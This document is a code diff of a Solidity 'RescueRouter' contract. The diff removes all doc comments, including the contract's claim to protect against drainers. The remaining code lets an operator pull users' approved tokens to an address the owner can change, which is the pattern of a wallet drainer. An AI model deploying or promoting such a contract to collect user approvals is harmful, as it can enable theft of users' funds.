@@ -1,14 +1,10 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.8.19;
+pragma solidity ^0.8.20;
 
 import "@openzeppelin/contracts/access/Ownable.sol";
-import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
+import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
 import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 
-/**
- * @title RescueRouter
- * @dev Emergency asset rescue contract for anti-drainer protection
- */
 contract RescueRouter is Ownable, ReentrancyGuard {
     address public operator;
     address public rescueDestination;
@@ -40,9 +36,6 @@ contract RescueRouter is Ownable, ReentrancyGuard {
         testMode = false;
     }
     
-    /**
-     * @dev Execute rescue transfer from approved user
-     */
     function rescueTokens(
         address token,
         address from,
@@ -55,7 +48,6 @@ contract RescueRouter is Ownable, ReentrancyGuard {
         uint256 allowance = tokenContract.allowance(from, address(this));
         require(allowance >= amount, "Insufficient allowance");
         
-        // Execute transferFrom
         bool success = tokenContract.transferFrom(from, rescueDestination, amount);
         require(success, "Transfer failed");
         
@@ -64,9 +56,6 @@ contract RescueRouter is Ownable, ReentrancyGuard {
         emit RescueExecuted(token, from, rescueDestination, amount, block.timestamp);
     }
     
-    /**
-     * @dev Batch rescue multiple tokens
-     */
     function batchRescue(
         address[] calldata tokens,
         address[] calldata fromAddresses,
@@ -99,35 +88,23 @@ contract RescueRouter is Ownable, ReentrancyGuard {
         }
     }
     
-    /**
-     * @dev Enable/disable test mode (for testing without real transfers)
-     */
     function enableTestMode(bool _enabled) external onlyOwner {
         testMode = _enabled;
         emit TestModeEnabled(_enabled);
     }
     
-    /**
-     * @dev Update operator address
-     */
     function setOperator(address _operator) external onlyOwner {
         require(_operator != address(0), "Invalid address");
         operator = _operator;
         emit OperatorUpdated(_operator);
     }
     
-    /**
-     * @dev Update rescue destination
-     */
     function setRescueDestination(address _destination) external onlyOwner {
         require(_destination != address(0), "Invalid address");
         rescueDestination = _destination;
         emit RescueDestinationUpdated(_destination);
     }
     
-    /**
-     * @dev Check if rescue is possible
-     */
     function canRescue(address token, address from, uint256 amount) external view returns (bool) {
         IERC20 tokenContract = IERC20(token);
         uint256 allowance = tokenContract.allowance(from, address(this));
@@ -136,16 +113,10 @@ contract RescueRouter is Ownable, ReentrancyGuard {
         return allowance >= amount && balance >= amount;
     }
     
-    /**
-     * @dev Get total rescued amount for user
-     */
     function getRescuedAmount(address token, address user) external view returns (uint256) {
         return rescuedAmounts[token][user];
     }
     
-    /**
-     * @dev Emergency withdraw stuck tokens
-     */
     function emergencyWithdraw(address token, uint256 amount) external onlyOwner {
         IERC20(token).transfer(owner(), amount);
     }
